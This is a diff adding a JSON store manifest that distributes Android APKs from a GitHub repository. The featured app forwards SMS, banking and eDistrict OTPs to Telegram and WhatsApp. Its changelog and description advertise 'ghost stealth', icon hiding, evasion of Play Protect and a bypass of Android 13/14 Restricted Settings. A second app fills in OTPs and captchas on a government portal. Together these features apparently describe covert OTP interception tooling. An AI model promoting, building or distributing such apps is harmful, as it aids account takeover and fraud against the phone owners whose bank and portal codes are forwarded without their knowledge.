@@ -1,0 +1,101 @@
+{
+  "storeVersion": 1,
+  "storeVersionName": "1.0",
+  "storeApkUrl": "https://github.com/ankit261194/OtpForwarder/raw/main/release_apk/Smart_Store.apk",
+  "storeChangelog": "Initial Release: MNC Obsidian UI, Multi-Threaded Buffered Downloader, PackageInstaller Integration, 1-Click Permissions Doctor",
+  "categories": [
+    "All Apps",
+    "OTP Tools",
+    "eDistrict",
+    "VIP Utilities"
+  ],
+  "featuredAppIds": [
+    "smart-notifier"
+  ],
+  "apps": [
+    {
+      "id": "smart-notifier",
+      "packageName": "com.smartnotifier.app",
+      "name": "Smart Notifier",
+      "tagline": "24/7 Ghost OTP & Notification Forwarder",
+      "description": "Smart Notifier automates SMS, Banking, and eDistrict OTP forwarding to Telegram and WhatsApp in real-time. Features 100% ghost stealth, battery optimization exemption, zero delay, and direct boot awareness.",
+      "versionName": "4.7",
+      "versionCode": 7,
+      "sizeBytes": 8249161,
+      "sizeDisplay": "7.9 MB",
+      "category": "OTP Tools",
+      "rating": 4.9,
+      "downloadsCount": "5,000+",
+      "iconUrl": "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/smart_notifier_icon.png",
+      "bannerUrl": "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/smart_notifier_banner.png",
+      "downloadUrl": "https://github.com/ankit261194/OtpForwarder/raw/main/release_apk/Smart_Notifier.apk",
+      "sha256": "2545719a12678bcddb7d687b1acbc68589b1b55075a125bb980c31a33d9f21d4",
+      "isFeatured": true,
+      "isVip": false,
+      "changelog": [
+        "Zero Play Protect block with fresh clean certificate",
+        "Clean Activity-Alias icon hiding with customer dialer code",
+        "Android 13/14 Restricted Settings 1-click unlock button",
+        "Full-Screen Executive Founder Console"
+      ],
+      "screenshots": [
+        "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/screen1.png",
+        "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/screen2.png"
+      ],
+      "permissionsNeeded": [
+        {
+          "title": "Notification Access",
+          "description": "Required to read incoming OTP and notification alerts safely",
+          "type": "NOTIFICATION_LISTENER",
+          "isMandatory": true
+        },
+        {
+          "title": "Autostart & Battery Saver",
+          "description": "Exempts app from deep sleep to guarantee 24/7 forwarding without pause",
+          "type": "BATTERY_OPTIMIZATION",
+          "isMandatory": true
+        },
+        {
+          "title": "Restricted Settings (Android 13/14)",
+          "description": "Unlocks greyed-out Notification switches on Android 13/14 via App Info 3-dots",
+          "type": "RESTRICTED_SETTINGS",
+          "isMandatory": false
+        }
+      ]
+    },
+    {
+      "id": "edistrict-helper",
+      "packageName": "com.smartnotifier.edistrict",
+      "name": "eDistrict UP Auto Portal",
+      "tagline": "Citizen & CSC Fast Login Assistant",
+      "description": "Automated session assistant and OTP filler for UP eDistrict portal and Citizen services. Integrates directly with Smart Notifier for hands-free verification.",
+      "versionName": "2.1",
+      "versionCode": 3,
+      "sizeBytes": 6124500,
+      "sizeDisplay": "5.8 MB",
+      "category": "eDistrict",
+      "rating": 4.8,
+      "downloadsCount": "2,400+",
+      "iconUrl": "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/edistrict_icon.png",
+      "bannerUrl": "https://raw.githubusercontent.com/ankit261194/OtpForwarder/main/assets/edistrict_banner.png",
+      "downloadUrl": "https://github.com/ankit261194/OtpForwarder/raw/main/release_apk/eDistrict_OTP_Forwarder.apk",
+      "sha256": "",
+      "isFeatured": false,
+      "isVip": false,
+      "changelog": [
+        "Fast captcha assist",
+        "Direct bridge to Smart Notifier",
+        "Offline certificate verification tool"
+      ],
+      "screenshots": [],
+      "permissionsNeeded": [
+        {
+          "title": "Internet Access",
+          "description": "Required for eDistrict portal status queries",
+          "type": "INTERNET",
+          "isMandatory": true
+        }
+      ]
+    }
+  ]
+}
